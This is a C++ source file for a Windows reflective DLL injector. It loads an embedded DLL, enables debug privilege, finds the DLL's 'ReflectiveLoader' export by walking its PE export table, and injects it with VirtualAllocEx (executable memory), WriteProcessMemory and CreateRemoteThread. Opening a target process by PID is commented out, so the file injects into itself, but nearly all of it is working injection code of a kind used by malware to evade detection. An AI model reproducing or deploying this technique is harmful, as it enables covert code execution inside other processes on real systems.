#include "injector.hpp"
#include "privilege_manager.hpp"
#include "throw_helper.hpp"

#include <cmrc/cmrc.hpp>

#include <cassert>
#include <iostream>

#include <windows.h>

#include "../payload/hash.hpp"

using namespace std;

CMRC_DECLARE(dll_payload);

template <size_t N>
UNICODE_STRING ToUnicodeString(const wchar_t(& str)[N]) {
  return {(N - 1) * sizeof(wchar_t), N * sizeof(wchar_t),
          const_cast<wchar_t*>(str)};
}

int main(int argc, char* argv[]) {
  if (argc < 2) {
    cout << "Usage: ReflectiveInjector <process_id>\n";
    return EXIT_FAILURE;
  }
  try {
    const auto resource_fs{cmrc::dll_payload::get_filesystem()};
    const auto payload{resource_fs.open("ReflectiveDLL.dll")};

    winapi::PrivilegeManager::GetInstance().GetPrivileges(SE_DEBUG_NAME);

    // const auto target_pid{stoul(argv[1])};
    const auto target{/*OpenProcessById(
        target_pid, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                        PROCESS_VM_READ)*/
                      wil::unique_handle{GetCurrentProcess()}};

    const auto payload_begin{
        reinterpret_cast<const std::byte*>(begin(payload))};
    const auto entry_point_offset{
        TryFindExportedEntry(payload_begin, "ReflectiveLoader")};

    LoadRemoteLibrary(target.get(), payload_begin,
                      static_cast<size_t>(end(payload) - begin(payload)),
                      entry_point_offset.value(), nullptr);

  } catch (const exception& exc) {
    cout << "Unhandled exception caught: " << exc.what() << endl;
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

namespace details {
bool IsSupportedArch(uint16_t magic) noexcept {
#ifdef _M_AMD64
  return magic == 0x020B;
#elif defined _M_IX86
  return magic == 0x010B;
#else
#error Unsupported architecture
#endif
}

const IMAGE_DOS_HEADER* GetDosHeader(const void* image_base) noexcept {
  return static_cast<const IMAGE_DOS_HEADER*>(image_base);
}

const IMAGE_NT_HEADERS* GetNtHeader(const void* image_base) noexcept {
  const auto* image_base_byte_addr{static_cast<const std::byte*>(image_base)};
  return reinterpret_cast<const IMAGE_NT_HEADERS*>(
      image_base_byte_addr + GetDosHeader(image_base)->e_lfanew);
}

uint32_t ConvertRvaToOffset(uint32_t rva, const void* image_base) noexcept {
  const auto* nt_header{GetNtHeader(image_base)};

  const auto* optional_header{
      reinterpret_cast<const std::byte*>(addressof(nt_header->OptionalHeader))};

  const auto& file_header{nt_header->FileHeader};
  const auto* section_header{reinterpret_cast<const IMAGE_SECTION_HEADER*>(
      optional_header + file_header.SizeOfOptionalHeader)};

  if (rva < section_header[0].PointerToRawData) {
    return rva;
  }

  for (uint16_t idx = 0; idx < file_header.NumberOfSections; ++idx) {
    auto& entry{section_header[idx]};
    if (const auto entry_begin = entry.VirtualAddress;
        rva >= entry_begin && rva < entry_begin + entry.SizeOfRawData) {
      return rva - entry_begin + entry.PointerToRawData;
    }
  }

  return 0;
}
}  // namespace details

optional<int32_t> TryFindExportedEntry(const void* image_base,
                                       string_view entry_name) noexcept {
  const auto* image_base_byte_addr{static_cast<const std::byte*>(image_base)};
  const auto* nt_header{details::GetNtHeader(image_base)};

  if (const auto magic = nt_header->OptionalHeader.Magic;
      !details::IsSupportedArch(magic)) {
    return nullopt;
  }

  const auto* raw_exports{reinterpret_cast<const std::byte*>(
      nt_header->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT)};

  const auto* export_dir{reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(
      image_base_byte_addr +
      details::ConvertRvaToOffset(
          reinterpret_cast<const IMAGE_DATA_DIRECTORY*>(raw_exports)
              ->VirtualAddress,
          image_base))};

  const auto* export_names{reinterpret_cast<const DWORD*>(
      image_base_byte_addr +
      details::ConvertRvaToOffset(export_dir->AddressOfNames, image_base))};

  const auto* name_ordinals{reinterpret_cast<const DWORD*>(
      image_base_byte_addr +
      details::ConvertRvaToOffset(export_dir->AddressOfNameOrdinals,
                                  image_base))};

  const auto* functions{
      image_base_byte_addr +
      details::ConvertRvaToOffset(export_dir->AddressOfFunctions, image_base)};

  for (size_t idx = 0; idx < export_dir->NumberOfNames;
       ++idx, ++export_names, ++name_ordinals) {
    const auto* raw_exported_name{
        image_base_byte_addr +
        details::ConvertRvaToOffset(*export_names, image_base)};

    if (const string_view exported_name_view =
            reinterpret_cast<const char*>(raw_exported_name);
        exported_name_view.find(entry_name) != string_view::npos) {
      const auto* ordinals_low_part{
          reinterpret_cast<const WORD*>(name_ordinals)};
      const auto* entry_ptr{reinterpret_cast<const DWORD*>(
          functions + *ordinals_low_part * sizeof(DWORD))};

      return details::ConvertRvaToOffset(*entry_ptr, image_base);
    }
  }
  return nullopt;
}

wil::unique_handle OpenProcessById(uint32_t process_id, uint32_t access_mask) {
  HANDLE process{OpenProcess(access_mask, false, process_id)};
  ThrowExceptionIfNot<runtime_error>(
      process, FormatWithLastError("unable to open process"));
  return wil::unique_handle{process};
}

void LoadRemoteLibrary(HANDLE target,
                       const std::byte* source,
                       size_t bytes_count,
                       size_t entry_point_offset,
                       void* entry_point_parameter) {
  assert(target && "invalid must be non-NULL");
  assert(source && bytes_count > 0 && "invalid data buffer");
  auto* remote_buffer{static_cast<std::byte*>(
      VirtualAllocEx(target, nullptr, bytes_count, MEM_RESERVE | MEM_COMMIT,
                     PAGE_EXECUTE_READWRITE))};
  ThrowExceptionIfNot<runtime_error>(
      remote_buffer,
      FormatWithLastError("unable to allocate memory in target process"));

  const BOOL written{
      WriteProcessMemory(target, remote_buffer, source, bytes_count, nullptr)};
  ThrowExceptionIfNot<runtime_error>(
      written,
      FormatWithLastError("unable to write into remote process memory"));

  auto* entry_point{reinterpret_cast<LPTHREAD_START_ROUTINE>(
      remote_buffer + entry_point_offset)};

  DWORD thread_id;
  const auto remote_thread{
      CreateRemoteThread(target, nullptr, 1024 * 1024, entry_point,
                         entry_point_parameter, 0, addressof(thread_id))};
  ThrowExceptionIfNot<runtime_error>(
      remote_thread, FormatWithLastError("unable to create remote thread"));

  CloseHandle(remote_thread);
}